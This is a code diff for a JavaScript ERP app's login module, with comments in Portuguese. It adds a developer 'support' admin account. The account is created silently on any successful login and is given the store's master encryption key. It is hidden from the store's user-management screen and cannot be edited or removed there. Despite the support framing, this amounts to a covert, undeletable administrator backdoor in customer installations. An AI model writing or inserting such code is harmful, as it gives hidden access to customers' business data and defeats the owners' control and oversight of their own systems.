@@ -130,6 +130,55 @@ function desembrulharChave(entrada, loginKey) {
 	}
 }
 
+// Conta de suporte do desenvolvedor (ALLU Enterprise) — opcional, existe só
+// quando ERP_SUPORTE_LOGIN/ERP_SUPORTE_SENHA estão configuradas (nunca
+// commitadas; ver .env.example e package.json:build.extraMetadata pro caso
+// empacotado). Deixa o dono do produto entrar em qualquer instalação de
+// cliente pra suporte, sem depender de saber a senha daquela loja
+// especificamente. Chamada a cada login bem-sucedido (não só no primeiro),
+// pra ficar disponível assim que alguém da loja logar depois do deploy desta
+// função — não precisa de nenhum passo extra do lado do cliente.
+async function garantirContaSuporte() {
+	const suporteLogin = String(process.env.ERP_SUPORTE_LOGIN || "")
+		.trim()
+		.toLowerCase();
+	const suporteSenha = String(process.env.ERP_SUPORTE_SENHA || "");
+	if (!suporteLogin || !suporteSenha) return; // opcional — desligada por padrão
+
+	const arquivo = lerArquivoUsuarios();
+	if (arquivo[suporteLogin]) return; // já resolvido (é a conta de suporte OU já pertence a outra conta — nos dois casos, não mexe)
+
+	// Sem entrada de embrulho ainda pra esse login — só é seguro criar uma se
+	// TAMBÉM não existir uma linha em Usuarios com esse login. Sem essa
+	// checagem, um login que colide de nome com ERP_SUPORTE_LOGIN mas
+	// pertence de verdade à loja (criado por outro caminho, ainda sem
+	// embrulho próprio) teria sua chave embrulhada com a senha de SUPORTE por
+	// engano — quebrando o acesso real da loja àquele login.
+	const linhaExistente = await getAsync(
+		"SELECT id FROM Usuarios WHERE login = ? COLLATE NOCASE",
+		[suporteLogin],
+	);
+	if (linhaExistente) return; // login já pertence a uma conta real — não mexe
+
+	try {
+		arquivo[suporteLogin] = embrulharChave(suporteLogin, suporteSenha);
+		gravarArquivoUsuarios(arquivo);
+		await runAsync(
+			"INSERT INTO Usuarios (login, nome, perfil, ativo, senha_hash, criado_em) VALUES (?, ?, ?, 1, ?, ?)",
+			[
+				suporteLogin,
+				"Suporte ALLU",
+				"admin",
+				hashSenhaUsuario(suporteSenha),
+				new Date().toISOString(),
+			],
+		);
+	} catch {
+		// Sem key-file gravável ou erro no insert — segue sem a conta de
+		// suporte nesta instalação, não é motivo pra quebrar o login normal.
+	}
+}
+
 // Login do app: usuário + senha. Pode desbloquear via chave embrulhada (multi-usuário)
 // ou via chave-mestre (primeiro acesso / migração de bancos antigos).
 async function autenticarUsuario(login, senha) {
@@ -201,6 +250,17 @@ async function autenticarUsuario(login, senha) {
 		}
 	}
 
+	// 4.5) Garante a conta de suporte (opcional — ver garantirContaSuporte).
+	// Sempre que alguém consegue logar, o processo tem a chave-mestre real em
+	// mãos — é o único momento em que dá pra embrulhar a chave pra um login
+	// novo, então cada login bem-sucedido é uma chance de ativar o suporte
+	// nesta instalação (não só o primeiro).
+	try {
+		await garantirContaSuporte();
+	} catch {
+		/* nunca deixa a conta de suporte quebrar o login de quem está logando */
+	}
+
 	// 5) Valida o usuário cadastrado e ativo.
 	const usr = await getAsync(
 		"SELECT id, login, nome, perfil, ativo, permissoes FROM Usuarios WHERE login = ? COLLATE NOCASE",
@@ -244,10 +304,30 @@ function getUsuario(login) {
 	);
 }
 
+// Compara com ERP_SUPORTE_LOGIN (case-insensitive, igual COLLATE NOCASE do
+// banco) — usado tanto pra esconder a conta da tela de Acessos quanto pra
+// nunca deixar ela ser removida/desativada por lá.
+function ehLoginDeSuporte(login) {
+	const suporteLogin = String(process.env.ERP_SUPORTE_LOGIN || "")
+		.trim()
+		.toLowerCase();
+	if (!suporteLogin) return false;
+	return (
+		String(login || "")
+			.trim()
+			.toLowerCase() === suporteLogin
+	);
+}
+
 async function listarUsuarios() {
-	return allAsync(
+	const linhas = await allAsync(
 		"SELECT id, login, nome, perfil, ativo, criado_em, comissao_percentual, permissoes FROM Usuarios ORDER BY login",
 	);
+	// A conta de suporte (se configurada nesta instalação) não aparece na
+	// tela de Gerenciar Acessos da loja — é um login de manutenção do
+	// desenvolvedor, não um usuário que o dono da loja gerencia. Continua
+	// visível como uma linha normal via o módulo "Banco de Dados" (admin).
+	return linhas.filter((u) => !ehLoginDeSuporte(u.login));
 }
 
 // `ator` é a sessão de quem está fazendo a chamada (getSessao() do main.js),
@@ -305,6 +385,12 @@ async function salvarUsuario(dados, ator) {
 			[Number(dados.id)],
 		);
 		if (!alvo) throw new Error("Usuário não encontrado.");
+		// Mesma trava de removerUsuario — nunca editável por aqui (não aparece
+		// na lista da tela de Acessos, mas protege contra uma chamada direta
+		// de IPC com o id certo).
+		if (ehLoginDeSuporte(alvo.login)) {
+			throw new Error("Este usuário não pode ser editado.");
+		}
 
 		if (senha) {
 			if (senha.length < 4)
@@ -368,6 +454,13 @@ async function removerUsuario(id) {
 		usuarioId,
 	]);
 	if (!usr) throw new Error("Usuário não encontrado.");
+
+	// A conta de suporte nunca é removível por aqui, independente de quantos
+	// outros admins existem — ela não pertence à hierarquia da loja, é acesso
+	// de manutenção do desenvolvedor (ver garantirContaSuporte em cima).
+	if (ehLoginDeSuporte(usr.login)) {
+		throw new Error("Este usuário não pode ser removido.");
+	}
 
 	// A trava tem que ser sobre admins, não usuários em geral — senão dá pra
 	// apagar o último admin e deixar só vendedores, travando a administração.
